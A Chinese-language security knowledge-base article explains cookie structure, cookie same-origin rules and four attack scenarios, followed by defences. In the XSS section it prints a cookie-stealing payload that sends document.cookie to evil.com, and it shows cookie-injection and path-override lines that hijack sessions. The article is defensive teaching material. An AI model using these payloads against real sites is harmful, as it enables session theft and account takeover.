---
title: Cookie 安全基础：结构、同源策略、风险场景与防御体系
description: 系统梳理 Cookie 结构字段、同源策略判定规则、会话与持久化机制，深度解析仅靠 Cookie 认证、HttpOnly 缺失、Secure
  标志缺失及路径覆盖攻击四大风险场景，给出避免敏感信息存储、防篡改令牌、加密存储、强制 HTTPS、HttpOnly 标志五大防御体系。
category: program-analysis
tags:
- Cookie
- Web安全
- 同源策略
- 会话管理
- XSS
- CSRF
- HttpOnly
- Secure
- 路径覆盖攻击
- 渗透测试
date: '2024-01-01'
updated: '2026-11-15'
---

## Cookie 结构与字段详解

### 核心字段组成

Cookie 由服务端通过 `Set-Cookie` 响应头设置，客户端在后续请求中自动携带 `Cookie` 请求头。其字段结构如下：

| 字段 | 说明 | 必选性 |
|------|------|--------|
| `name=value` | 键值对，Cookie 的核心标识与数据载荷 | **必选** |
| `path` | 作用路径，浏览器仅向匹配路径发送 Cookie | 可选 |
| `domain` | 作用域，支持子域匹配（如 `.example.com` 覆盖所有子域） | 可选 |
| `expires` | 绝对过期时间（GMT 格式），不设置则为会话 Cookie | 可选 |
| `max-age` | 相对过期时间（秒），优先级高于 `expires` | 可选 |
| `Secure` | 仅在 HTTPS 连接中传输 | 可选 |
| `HttpOnly` | 禁止 JavaScript 通过 `document.cookie` 访问 | 可选 |

> **规范参考**：RFC 6265 为当前最新 Cookie 规范，定义了浏览器与服务器的协作行为。

### 关键字段行为补充

- **`domain` 写法差异**：`domain=example.com` 仅对当前域生效；`domain=.example.com` 对所有子域生效（前导点可省略，浏览器自动补全）。
- **`expires` 与 `max-age` 共存时**：`max-age` 优先，避免客户端/服务端时间不同步导致的偏差。
- **`Secure` 仅保障传输加密**：本地存储的 Cookie 文件仍可被读取，**切勿在 Cookie 中存放敏感明文**。
- **`HttpOnly` 仅限制脚本访问**：HTTP 请求仍会自动携带，且本地文件依然存在。

## Cookie 同源策略判定规则

Cookie 的同源判定依据 **`name`、`domain`、`path` 三元组**，并受 `HttpOnly` 与 `Secure` 约束。这与 Web 标准同源策略（`scheme`、`domain`、`port` 三元组）存在本质差异。

### 典型读取/写入场景矩阵

| 场景 | 能否读取/写入 | 原因 |
|------|---------------|------|
| `http://test.com` → `http://test.com:8000` | ✅ | 端口不参与 Cookie 同源判定 |
| `http://test.com` → `https://test.com` | ✅（无 Secure） | 协议不参与 Cookie 同源判定 |
| `http://test.com` → `https://test.com` | ❌（有 Secure） | Secure 标志强制仅 HTTPS 传输 |
| 任意页面 → `HttpOnly` Cookie | ❌（JS 读写） | HttpOnly 禁止 `document.cookie` 访问 |
| 任意页面 → `HttpOnly` Cookie | ✅（HTTP 请求） | 请求头自动携带，不受 HttpOnly 限制 |

> **跨域共享 Cookie 典型配置**：`domain=.example.com; path=/`，实现一级域名下所有子域共享会话状态。

## 会话 Cookie 与持久化 Cookie 机制

### 会话 Cookie（Session Cookie）
- **特征**：未设置 `expires`/`max-age`。
- **生命周期**：浏览器进程存续期间（关闭浏览器销毁，关闭标签页不销毁）。
- **类比**：一次性交易凭证，离开即失效。

### 持久化 Cookie（Persistent Cookie）
- **特征**：设置了 `expires` 或 `max-age`。
- **生命周期**：到达指定时间戳或经过指定秒数前持久保存（浏览器关闭不销毁）。
- **存储形式**：写入浏览器 Cookie 文件/数据库（如 Chrome 的 `Cookies` SQLite 数据库）。

### 工作流程演示
1. 客户端首次请求 `http://localhost:3000/` → 请求头无 `Cookie`。
2. 服务端响应 `Set-Cookie: sessionid=abc123; Path=/; HttpOnly`。
3. 客户端刷新/再次请求 → 请求头自动携带 `Cookie: sessionid=abc123`。
4. 服务端据此识别用户会话状态。

## 四大核心风险场景深度解析

### 仅靠 Cookie 进行身份认证（无 Session 校验）

**漏洞本质**：将认证凭据（如 `Uid=1`、`role=admin`）直接以明文键值对存放在 Cookie 中，服务端仅校验 Cookie 值即放行。

**攻击演示**：
```http
Cookie: Uid=1
```
攻击者修改为 `Uid=2` 即可越权访问用户 2 的资源；修改为 `Uid=0` 或 `role=admin` 可实现垂直越权。

**真实案例**：某系统直接校验 `UserId`，无任何服务端 Session 绑定，导致水平/垂直越权。

**关联场景**：[[xd-security-logic-vulnerability-notes-day33-36]] 中的 IDOR（不安全直接对象引用）与越权漏洞本质一致。

---

### HttpOnly 标志缺失导致 XSS 窃取 Cookie

**漏洞本质**：关键 Cookie（如 `sessionid`、`token`）未设置 `HttpOnly`，攻击者利用同域 XSS 通过 `document.cookie` 读取并外带。

**攻击载荷**：
```javascript
new Image().src = "http://evil.com/log?" + escape(document.cookie);
```

**利用链**：
1. 目标站点存在反射型/存储型 XSS（如个人信息页未过滤特殊字符）。
2. 攻击者构造恶意链接诱导受害者点击。
3. 受害者浏览器执行脚本，Cookie 发送至攻击者服务器。
4. 攻击者替换自身 Cookie 登录，完成账号接管。

**防御现状**：现代框架默认开启 `HttpOnly`，但历史遗留系统、自定义 Cookie 逻辑仍可能遗漏。

**关联页面**：
- [[xd-security-xss-vulnerability-notes-day25-28]] - XSS 原理、HttpOnly 绕过技巧、BeEF 实战
- [[leanote-markdown-xss-to-electron-rce-case-study]] - 存储型 XSS 窃取 Cookie 进而 RCE 的完整攻击链
- [[attack-defense-world-beginner-web-writeup]] - Cookie 篡改关卡实战

---

### Secure 标志缺失导致 HTTPS Cookie 经 HTTP 泄露与覆盖

#### 读取泄露
- **场景**：HTTPS 站点设置 Cookie 未加 `Secure`，同域下存在 HTTP 页面或可注入 HTTP 请求。
- **攻击**：攻击者在 HTTP 页面植入 XSS，通过 `document.cookie` 读取本应仅 HTTPS 传输的 Cookie。

#### 写入覆盖（Cookie 注入/会话固定变种）
- **场景**：HTTPS 站点 Cookie 无 `Secure`，攻击者可在 HTTP 环境下**写入**同名 Cookie。
- **经典案例（Google 历史漏洞）**：
  1. 受害者登录 Google（HTTPS，设置 `PREF=...` 无 Secure）。
  2. 攻击者诱导受害者访问 HTTP 页面，注入 `document.cookie="PREF=attacker_id; domain=.google.com; path=/"`。
  3. 受害者后续 HTTPS 请求携带攻击者 Cookie，搜索历史等行为记录至攻击者账号。

**根因**：RFC 未强制 Cookie 名唯一，浏览器按 `path` 长度、`creation_time` 等规则决定优先级，**写入不受 Secure 限制**。

---

### 路径覆盖攻击

**漏洞本质**：利用 Cookie `path` 属性的优先级规则（路径越长优先级越高），在子路径下写入同名 Cookie，劫持特定功能接口的会话身份。

**攻击前置条件**：
- 目标站点主域设置宽泛 Cookie：`user=admin; domain=.test.com; path=/; Secure; HttpOnly`
- 站点存在 XSS 或可控制子路径页面（如 AJAX 请求 `/aaa`）

**攻击步骤**：
```javascript
// 在 http://www.test.com 页面执行
document.cookie = "user=attacker; domain=.test.com; path=/aaa; Secure; HttpOnly";
```

**效果**：
- 访问 `/aaa/*` 接口时，浏览器发送 `user=attacker`（path=/aaa 优先于 path=/）。
- 访问其他路径仍发送 `user=admin`。
- **实战危害**：受害者在 `/aaa/recharge` 充值接口操作时，款项记入攻击者账号。

**关键点**：
- `HttpOnly` 与 `Secure` **不阻止写入**，仅限制 JS 读取与明文传输。
- RFC 6265 §5.3 规定：同名 Cookie 以 `path` 长度降序、`creation_time` 升序排序，首项生效。

**关联场景**：[[xd-security-csrf-ssrf-rce-notes-day29-30]] 中的 CSRF 与会话劫持常结合路径覆盖实现精准攻击。

## 五大防御体系构建

### 避免在 Cookie 中存放敏感信息
- **原则**：Cookie 仅存储**不敏感的会话标识符**（如 `session_id`、`jwt_token`），所有业务数据（用户 ID、权限、余额）存储在服务端 Session/Redis/数据库中。
- **对比**：
  | 方案 | 安全性 | 适用场景 |
  |------|--------|----------|
  | Cookie 存明文 Uid/Role | ❌ 极低 | 严禁使用 |
  | Cookie 存 Session ID + 服务端 Session | ✅ 高 | 传统有状态应用 |
  | Cookie 存 JWT（签名+加密） | ✅ 高（需妥善保管密钥） | 无状态微服务、SSO |
- **关联**：[[jwt漏洞原理与实战利用]] - JWT 算法混淆、密钥爆破、None Algorithm 等风险需同步防范。

---

### 防篡改令牌 / 登录随机验证码（双 Cookie 校验机制）

**设计思路**：登录成功后，服务端生成**不可预测的随机值**（`randnum`/`token`），写入数据库绑定用户，同时写入 Cookie。后续请求需**双 Cookie 同时校验**。

```text
Cookie: username=admin; verify_token=a1b2c3d4e5  // 伪造 username 无法通过 verify_token 校验
```

**关键要素**：
- `verify_token`：加密随机数（CSPRNG 生成），足够熵（≥128 bit）。
- **时效性**：定期轮换（如每次登录、敏感操作前、固定时间窗口）。
- **绑定性**：与用户 ID、IP、User-Agent 强绑定，防止跨用户复用。

**局限**：若 XSS 可同时读取双 Cookie，仍可绕过。需配合 HttpOnly、CSP、同站隔离。

---

### 加密存储防止明文值被破解

**适用场景**：必须在客户端存储少量业务数据（如记住我功能、个性化偏好）且无法完全依赖服务端 Session。

**实施方案**：
- **对称加密**：AES-256-GCM（认证加密），密钥仅服务端持有，Cookie 存 `iv+ciphertext+tag`。
- **签名防篡改**：HMAC-SHA256(key, value) 拼接至值末尾，校验完整性。
- **格式示例**：
  ```text
  Cookie: pref=eyJkYXRhIjoi... (Base64URL 编码的加密载荷)
  ```

**注意**：加密不等于安全，需配合 `Secure`、`HttpOnly`、短过期时间、定期轮换密钥。

---

### 强制 HTTPS 与 Secure 标志

**服务端配置**：
```http
Set-Cookie: sessionid=abc123; Path=/; Secure; HttpOnly; SameSite=Strict
```

**配套措施**：
- **HSTS**（`Strict-Transport-Security: max-age=31536000; includeSubDomains; preload`）：强制浏览器仅 HTTPS 访问，消除 HTTP 降级窗口。
- **全站 HTTPS**：登录、注册、API、静态资源全链路 HTTPS，避免混合内容导致 Cookie 泄露。
- **SameSite 属性**：`Strict`/`Lax` 防御 CSRF，`None` 必须配合 `Secure`（跨站场景）。

**关联**：[[xd-security-pentest-basic-stage-notes]] - WAF 绕过与 HTTPS 降级攻击防范。

---

### 关键 Cookie 强制 HttpOnly 标志

**配置模板**：
```http
Set-Cookie: sessionid=abc123; Path=/; Secure; HttpOnly; SameSite=Lax
Set-Cookie: csrf_token=xyz789; Path=/; Secure; HttpOnly; SameSite=Strict
```

**覆盖范围**：
- 所有**认证类** Cookie（`sessionid`、`token`、`remember_me`）。
- 所有**状态变更类** Token（`csrf_token`、`oauth_state`、`nonce`）。
- **禁止**前端 JS 需读取的 Cookie 设置 HttpOnly（改用 `localStorage`/`sessionStorage` + CSP）。

**检测手段**：
- 自动化扫描：Burp Suite、OWASP ZAP、自定义脚本遍历 `Set-Cookie` 头检查 `HttpOnly` 缺失。
- 代码审计：搜索 `setCookie`/`response.cookies.set` 等调用，确认 `httpOnly: true`。

## 总结与最佳实践清单

| 防御层面 | 核心动作 | 验证方法 |
|----------|----------|----------|
| **最小化敏感数据** | 无业务明文入 Cookie，仅存会话标识 | 代码审计、Cookie 扫描 |
| **完整性保护** | 双 Token 校验、签名/加密存储 | 渗透测试篡改验证 |
| **传输加密** | 全站 HTTPS + HSTS + Secure 标志 | SSL Labs 测试、头部检查 |
| **脚本隔离** | 认证 Cookie 全 HttpOnly | 自动化扫描、XSS 利用尝试 |
| **同站隔离** | SameSite=Lax/Strict + CSRF Token | CSRF 测试、跨站请求观察 |
| **生命周期控制** | 短过期、关键操作强制刷新、登出即销毁 | 会话固定/劫持测试 |

> **核心认知**：Cookie 本身非漏洞，但其**设计缺陷**（同源策略宽松、写入无保护、唯一性不保证）配合 **XSS/中间人/逻辑缺陷** 形成完整攻击面。防御必须是**纵深体系**：服务端架构（Session/JWT）、传输层（HTTPS/HSTS）、客户端属性、应用层逻辑（防篡改、防重放）多层叠加。

## 交叉引用导航

- **XSS 与 Cookie 窃取实战**：[[xd-security-xss-vulnerability-notes-day25-28]]、[[leanote-markdown-xss-to-electron-rce-case-study]]、[[attack-defense-world-beginner-web-writeup]]
- **CSRF/SSRF 与会话劫持**：[[xd-security-csrf-ssrf-rce-notes-day29-30]]、[[ssrf-bypass-techniques]]
- **JWT 认证替代方案风险**：[[jwt漏洞原理与实战利用]]
- **逻辑越权与 IDOR**：[[xd-security-logic-vulnerability-notes-day33-36]]
- **渗透测试基础阶段 Cookie 相关检测**：[[xd-security-pentest-basic-stage-notes]]
- **Pikachu 靶场 Cookie 篡改/暴力破解实战**：[[pikachu-target-writeup-part1-setup-brute-force]]、[[pikachu-target-writeup-part3]]
- **WebSocket 跨站劫持**：[[websocket-vulnerabilities-analysis]]

## 来源

- [226安全团队-201805-202103_25](../sources/226安全团队-201805-202103_25.md)
